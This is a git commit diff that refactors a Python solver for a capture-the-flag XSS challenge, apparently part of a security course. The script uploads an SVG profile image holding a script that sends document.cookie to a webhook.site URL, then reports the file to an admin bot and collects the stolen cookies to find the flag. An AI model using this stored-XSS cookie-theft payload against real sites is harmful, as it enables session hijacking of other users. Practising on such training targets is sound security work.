874bc99166785279775b5a72081a6a89a42dce5c
SAW <99191294+nicsaw@users.noreply.github.com>
2025-05-14 02:14:27 +1000

    Profile: simplify

--- ctf/4-XSS/profile.py
+++ ctf/4-XSS/profile.py
@@ -1,39 +1,25 @@
 import sys
 from pathlib import Path
 sys.path.append(str(Path(__file__).resolve().parent.parent))
-from utils import get_session, find_flag
+from utils import get_session, WebhookSite
 
 # https://portswigger.net/web-security/file-upload#:~:text=Uploading%20malicious%20client%2Dside%20scripts
 
 import io
 import urllib.parse
 
-BASE_URL = "https://profile.quoccacorp.com"
-
 class Solver:
     def __init__(self):
         self.session = get_session()
-        self.webhooksite_uuid = self.get_webhooksite_uuid()
-        self.webhooksite_url = f"https://webhook.site/{self.webhooksite_uuid}"
-        self.webhooksite_requests_url = f"https://webhook.site/token/{self.webhooksite_uuid}/requests"
-
-    def get_webhooksite_uuid(self):
-        response = self.session.post("https://webhook.site/token")
-        return response.json()["uuid"]
-
-    def find_flag_webhooksite(self, delay_seconds=2):
-        import time, json
-        time.sleep(delay_seconds)
-        response = self.session.get(self.webhooksite_requests_url)
-        response_json = response.json()
-        response_json_text = json.dumps(response_json, indent=2)
-        find_flag(response_json_text)
+        self.webhooksite = WebhookSite()
 
     def generate_random_string(self, length = 10):
         import random, string
         return ''.join(random.choices(string.ascii_letters, k=length))
 
     def main(self):
+        BASE_URL = "https://profile.quoccacorp.com"
+
         # Log in
         response = self.session.get(BASE_URL)
         login_url = response.url
@@ -44,7 +30,7 @@ class Solver:
         # Craft SVG File Payload
         SVG_PAYLOAD = f'''<svg xmlns="http://www.w3.org/2000/svg">
     <script>
-        fetch(`{self.webhooksite_url}?q=${{document.cookie}}`)
+        fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)
     </script>
 </svg>'''
         svg_file = io.BytesIO(SVG_PAYLOAD.encode())
@@ -56,7 +42,7 @@ class Solver:
         # Report to Admin
         url_encoded_svg_path = urllib.parse.quote(f"/profileimage/{username}.svg")
         self.session.post(f"{BASE_URL}/report", data={"path": url_encoded_svg_path})
-        self.find_flag_webhooksite()
+        self.webhooksite.find_flags()
 
 if __name__ == "__main__":
     Solver().main()
